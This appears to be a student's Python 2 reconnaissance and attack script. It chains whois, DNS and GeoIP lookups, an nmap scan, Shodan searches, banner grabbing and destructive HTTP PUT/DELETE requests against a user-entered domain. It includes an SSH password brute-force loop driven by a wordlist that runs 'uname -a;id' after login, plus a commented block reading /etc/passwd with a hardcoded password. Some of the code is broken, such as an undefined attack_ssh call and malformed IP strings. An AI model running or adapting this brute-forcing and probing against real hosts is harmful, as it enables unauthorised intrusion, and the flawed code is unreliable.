# -*- encoding: utf-8 -*-
import whois
import getpass
import sys
import os
import socket
reload(sys)
sys.setdefaultencoding('utf8')

#dns utilities
import dns
import dns.resolver
import dns.query
import dns.zone

#geolocalizacion
import pygeoip
import pprint

#nmap
import nmap

# busqueda shodan
import shodan

# request http
import urllib, requests

# scrapy
from scrapy.linkextractors import LinkExtractor
from scrapy.selector import Selector
from scrapy import Request
from scrapy.item import Item, Field
from scrapy.spiders import CrawlSpider, Rule
import pydispatch
from twisted.internet import reactor
from scrapy import signals
from scrapy.utils.project import get_project_settings
from scrapy.crawler import Crawler

# ssh
import paramiko


shodanKeyString = open('shodanKey.txt').readline().rstrip('\n')

class HackerWayItem(Item):
    title = Field()
    author =  Field()
    tag = Field()
    date = Field()

class BloggerSpider(CrawlSpider):
    name="TheHackerWay"
    start_urls=['http://thehackerway.com']
    # urls desde las cuales el spider comenzará el proceso de crawling
    rules = [Rule(LinkExtractor(allow=[r'\d{4}/\d{2}/\d{2}/\w+']), callback='parse_blog')]# http://thehackerway.com/YYYY/MM/DD/titulo URL

def shodanKeyInfo():
    try:
        shodanApi = shodan.Shodan(shodanKeyString)
        info = shodanApi.info()
        for inf in info:
            print '%s: %s ' %(inf, info[inf])
    except shodan.APIError, e:
        print 'Error: %s' % e

def shodanSimpleSearch():
    try:
        shodanApi = shodan.Shodan(shodanKeyString)
        results = shodanApi.search(dominio)
        for result in results:
            print '%s: %s ' %(result, results[result])
            fd.write ('%s: %s \n' %(result, results[result]))
    except shodan.APIError, e:
        print 'Error: %s' % e

def dnsNsRecord():
    try:
        ns1 = dns.resolver.query(str(dominioext), 'NS')
        for i in ns1.response.answer:
            for j in i.items:
                fd.write(" NameServer "+ j.to_text()+ "\n")
        fd.write ("\n")
    except dns.exception.DNSException:
        print 'Error recibiendo registros NS'
        fd.write("Error recibiendo registros NS \n")
        fd.write("\n")
        os.system('kill $PPID')



def dnsTxtRecord():
    try:
        txt1 = dns.resolver.query(str(dominioext), 'TXT')
        for i in txt1.response.answer:
            for j in i.items:
                fd.write(" TXT "+ j.to_text()+ "\n")
        fd.write ("\n")
    except dns.exception.DNSException:
        print 'Error recibiendo registros TXT'
        fd.write("Error recibiendo registros TXT \n")
        fd.write ("\n")

def dnsMxRecord():
    try:
        mx1 = dns.resolver.query(str(dominioext), 'MX')
        for i in mx1.response.answer:
            for j in i.items:
                fd.write(" MX "+ j.to_text()+ "\n")
        fd.write ("\n")
    except dns.exception.DNSException:
        print 'Error recibiendo registros MX'
        fd.write("Error recibiendo registros MX \n")
        fd.write ("\n")

def parse_blog(self, response):
    print 'link parseado %s' %response.url
    hxs = Selector(response)
    item = HackerWayItem()
    item['title'] = hxs.select('//title/text()').extract() # Selector XPath para el titulo
    item['author'] = hxs.select("//span[@class='author']/a/text()").extract() # Selector XPath para el author
    item['tag'] = hxs.select("//meta[@property='og:title']/text()").extract() # Selector XPath para el tag
    item['date'] = hxs.select("//span[@class='date']/text()").extract() # Selector XPath para la fecha
    return item # Retornando el Item.

def catch_item(sender, item, **kwargs):
    print "Item Extraido:", item


def grab_banner(ip_address,port):
      try:
           s=socket.socket()
           s.connect((ip_address,port))
           banner = s.recv(1024)
           print ip_address + ':' + banner
           fd.write ("\n")
           fd.write("Banner retornado por "+ str(ip_address)+ " "+ str(banner)+ "\n")
      except:
          print ip_address + ': No tiene Banner'
          fd.write ("\n")
          fd.write("No tiene Banner \n")


#def dnsARecord():
#    try:
#        a1 = dns.resolver.query(str(dominio), 'A')
#        for i in a1.response.answer:
#            for j in i.items:
#                ip = j.to_text()
#                pprint.pprint(" A "+ j.to_text()+ "\n")
#                fd.write(" A "+ j.to_text()+ "\n")
#        fd.write ("\n")
#        return ip
#    except dns.exception.DNSException:
#        print 'Error recibiendo registros A'
#        fd.write("Error recibiendo registros A \n")
#        fd.write ("\n")

ADDITIONAL_RDCLASS = 65535
name_server = '8.8.8.8'

# ********************************** 1A WHOIS ***********************************************
# Petició de domini a buscar
dominio = getpass.getpass("Dominio a recabar informacion: ")

#if len(dominio) != 2:
#    print "[-] usage python PythonWhois.py <domain_name>"
#    sys.exit()


whois = whois.whois(dominio)
fd = open("dades.txt", "r+")
fd.write ("Datos recogidos por Whois\n")
for key in whois.keys():
    print "[+] %s : %s \n" %(key, whois[key])
    fd.write (""+ str(key)+ " "+ str((whois[key]))+ "\n")


# ********************************** 1B Registres DNS ***********************************************
fd.write ("\n")
fd.write ("\n")
dominiodns = dominio.split(".")[1]
extensidns = dominio.split(".")[2]
dominioext = dominiodns+ "."+ extensidns
print dominioext
fd.write ("Registros DNS obtenidos del dominio "+ str(dominioext) +"\n")

#ns1 = dns.resolver.query(str(dominioext), 'NS')
#for i in ns1.response.answer:
#    for j in i.items:
#        fd.write(" NameServer "+ j.to_text()+ "\n")
#fd.write ("\n")
dnsNsRecord()

#txt1 = dns.resolver.query(str(dominioext), 'TXT')
#for i in txt1.response.answer:
#    for j in i.items:
#        fd.write(" TXT "+ j.to_text()+ "\n")
#fd.write ("\n")
dnsTxtRecord()

#mx1 = dns.resolver.query(str(dominioext), 'MX')
#for i in mx1.response.answer:
#    for j in i.items:
#        fd.write(" MX "+ j.to_text()+ "\n")
#fd.write ("\n")
dnsMxRecord()

a1 = dns.resolver.query(str(dominio), 'A')
for i in a1.response.answer:
    for j in i.items:
        ip = j.to_text()
        pprint.pprint(" A "+ j.to_text()+ "\n")
        fd.write(" A "+ j.to_text()+ "\n")
fd.write ("\n")
#dnsARecord()

# ********************************** 2A Geolocalitzacio DNS ***********************************************
fd.write ("\n")
fd.write ("Datos Geolocalización del dominio "+ str(dominio) +"\n")
gi = pygeoip.GeoIP('GeoLiteCity.dat')

pprint.pprint("Country code: %s " %(str(gi.country_code_by_name(str(dominio)))) )
fd.write ("Country code: %s \n" %(str(gi.country_code_by_name(str(dominio)))) )
pprint.pprint("Full record: %s " %(str(gi.record_by_addr(str(ip)))) )
fd.write ("Full record: %s \n" %(str(gi.record_by_addr(str(ip)))) )
pprint.pprint("Country name: %s " %(str(gi.country_name_by_addr(str(ip)))) )
fd.write ("Country name: %s \n" %(str(gi.country_name_by_addr(str(ip)))) )
pprint.pprint("Timezone: %s " %(str(gi.time_zone_by_addr(str(ip)))) )
fd.write ("Timezone: %s \n" %(str(gi.time_zone_by_addr(str(ip)))) )
fd.write ("\n")


# ********************************** NMAP  ***********************************************
nm = nmap.PortScanner()
nm.scan("'"+ str(ip)+ "'", '22-443')
nm.command_line()
nm.scaninfo()
shodanval = 0
shodanvalssh = 0

for host in nm.all_hosts():
    print('---------------------------------------------------')
    fd.write('------------Scaneo puertos abiertos---------------------------------------- \n')
    print('Host : %s (%s)' % (host, nm[host].hostname()))
    fd.write('Host : %s (%s) \n' % (host, nm[host].hostname()))
    print('State : %s' % nm[host].state())
    fd.write('State : %s \n' % nm[host].state())
    for proto in nm[host].all_protocols():
        print('----------')
        fd.write('Protocol : %s \n' % proto)
        print('Protocol : %s' % proto)
        lport = nm[host][proto].keys()
        lport.sort()
        for port in lport:
            fd.write('port : %s\tstate : %s \n' % (port, nm[host][proto][port]['state']))
            print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
            if port == 80 or port == 443 or port ==8080:
                shodanval = 1
            if port == 22:
                shodanvalssh = 1
        if shodanval == 1:
            fd.write ("\n")
            fd.write('------------Scaneo datos Shodan---------------------------------------- \n')
            fd.write ('Datos devueltos por Shodan sobre %s \n' % host)
            shodanSimpleSearch()
# ********************************** SSH check  ***********************************************
        if shodanvalssh == 1:
            grab_banner("'"+ str(ip)+ "'", 22)
            f = open('/home/tic/Dropbox/python/projecte/unix_passwords.txt', 'r') # open password list
            ssh = paramiko.SSHClient()                         #set up ssh client
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #This will add the host key if you are connecting to a server for the first time
            for passwd in f:                   # loop through password list
                attack_ssh(passwd.rstrip())

grab_banner('127.0.0.1', 22)
f = open('/home/tic/Dropbox/python/projecte/unix_passwords.txt', 'r')
"""for passwd in f:
    paramiko.util.log_to_file('paramiko.log')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print "test %s \n" %(passwd.rstrip())
    ssh.connect('172.0.0.1', username='tic', password= 'hurwicz')
    sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
    for line in stdout.readlines():
        print line.strip()
    ssh.close()"""
paramiko.util.log_to_file('paramiko.log')
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
for passwd in f:
    print "test %s \n" %(passwd.rstrip())
    client.connect('127.0.0.1', username='tic', password='%s' %(passwd.rstrip()))
    stdin, stdout, stderr = client.exec_command('uname -a;id')
    for line in stdout.readlines():
        print line
    client.close()
f.close()

# ********************************** Requests Web Page  ***********************************************
fd.write ("\n")
fd.write('------------Requests Web Page---------------------------------------- \n')
response = urllib.urlopen("http://"+ str(dominio))
print "Response Code: "+ str(response.getcode())
fd.write("Response Code: "+str(response.getcode())+ "\n")
print "Response: "+response.read()
fd.write("Response: "+response.read()+ "\n")
print response.geturl()
fd.write(response.geturl()+ "\n")
for header, value in response.headers.items():
    print header+' : '+value
    fd.write(header+' : '+value+ "\n")
responseGet = requests.get("http://"+ str(dominio))
responsePost = requests.post("http://"+ str(dominio))
responsePut = requests.put("http://"+ str(dominio))
responseDelete = requests.delete("http://"+ str(dominio))

print "GET Request. Status code: "+str(responseGet.status_code)
print responseGet.text
fd.write("GET Request. Status code: "+str(responseGet.status_code))
fd.write(responseGet.text+ "\n")

print "POST Request. Status code: "+str(responsePost.status_code)
print responsePost.text
fd.write("POST Request. Status code: "+str(responsePost.status_code))
fd.write(responsePost.text+ "\n")

print "PUT Request. Status code: "+str(responsePut.status_code)
print responsePut.text
fd.write("PUT Request. Status code: "+str(responsePut.status_code))
fd.write(responsePut.text+ "\n")

print "DELETE Request. Status code: "+str(responseDelete.status_code)
print responseDelete.text
fd.write("DELETE Request. Status code: "+str(responseDelete.status_code))
fd.write(responseDelete.text+ "\n")

"""# ********************************** Scrapy  ***********************************************
pydispatch.connect(catch_item, signal=signals.item_passed)
pydispatch.connect(reactor.stop, signal=signals.spider_closed)

settings = get_project_settings()
crawler = Crawler(settings)
crawler.configure()

spider = BloggerSpider()
crawler.crawl(spider)
print "\n[+] Starting scrapy engine..."
crawler.start()
reactor.run()"""


fd.close()